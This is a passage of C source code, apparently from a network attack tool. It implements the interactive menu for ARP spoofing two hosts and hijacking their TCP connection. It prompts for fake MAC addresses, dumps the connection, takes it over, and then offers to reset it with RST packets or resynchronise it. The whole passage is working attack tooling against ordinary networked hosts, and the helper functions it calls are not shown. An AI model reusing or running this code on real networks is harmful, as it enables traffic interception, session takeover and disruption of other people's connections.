a_hijack(void)
{
	unsigned char __src_fake_mac[ETH_ALEN] = {0xEA, 0x1A, 0xDE, 0xAD, 0xBE, 0xEF};
	unsigned char __dst_fake_mac[ETH_ALEN] = {0xEA, 0x1A, 0xDE, 0xAD, 0xBE, 0xEE};
	unsigned char *src_fake_mac = NULL;
	unsigned char *dst_fake_mac = NULL;
	char buf[BUFSIZE];
	struct user_conn_info uci;
	int retval, retval2;
	int c, input_mode;

	if (!choose_connection(&uci)) {
		if (!get_arp_spoof(uci.src_addr, uci.dst_addr) &&
		    !get_arp_spoof(uci.dst_addr, uci.src_addr)) {
			c = menu_choose_char("arp spoof src in dst y/n", "yn", 'y');
			switch (c) {
			    case 'y':
				sprintf_eth_mac(buf, suggest_mac());
				if (menu_choose_mac("src MAC", __src_fake_mac, buf) < 0)
					return;
				src_fake_mac = __src_fake_mac;
				break;
			    case 'n':
				src_fake_mac = NULL;
				break;
			    default:
				return;
			}
			c = menu_choose_char("arp spoof dst in src y/n", "yn", 'y');
			switch (c) {
			    case 'y':
				sprintf_eth_mac(buf, suggest_mac());
				if (menu_choose_mac("dst MAC", __dst_fake_mac, buf) < 0)
					return;
				dst_fake_mac = __dst_fake_mac;
				break;
			    case 'n':
				dst_fake_mac = NULL;
				break;
			    default:
				return;
			}
			if (!src_fake_mac && !dst_fake_mac) {
				printf("Possible ACK storm can ocure because you don't do ARP spoof at all, OK\n");
			}
		} else {
			printf("hosts already ARP spoofed\n");
		}
		switch (menu_choose_char("input mode [r]aw, [l]ine+echo+\\r, line+[e]cho", "rle", 'r')) {
		    case 'r':
			input_mode = INPUT_MODE_RAW;
			break;
		    case 'l':
			input_mode = INPUT_MODE_LINEECHOR;
			break;
		    case 'e':
			input_mode = INPUT_MODE_LINEECHO;
			break;
		    default:
			return;
		}
		c = menu_choose_char("dump connectin y/n", "yn", 'y');
		switch (c) {
		    case 'y':
			dump_connection(&uci);
			break;
		    case 'n':
			press_key("press key to take over of connection");
			break;
		    default:
			return;
		}
		retval = user_arp_hijack(&uci, src_fake_mac, dst_fake_mac, input_mode);

		if (retval <= 0) {
			c = menu_choose_char("\n[r]eset connection/[s]ynchronize/[n]one", "rsn", 'r');
			switch (c) {
			    case 'r':
				user_rst(&uci, 1, MODE_BOTH);
				break;
			    case 's':
				retval2 = user_hijack_sync(&uci);
				if (retval2) {
					printf("\n");
					c = menu_choose_char("[r]eset connection/[n]one", "rn", 'r');
					switch (c) {
					    case 'r':
						user_rst(&uci, 1, MODE_BOTH);
						break;
					}
				} else
					printf("\n");
				break;
			}
		}
		user_arp_hijack_done(src_fake_mac, dst_fake_mac);
		printf("done\n");
	}
}
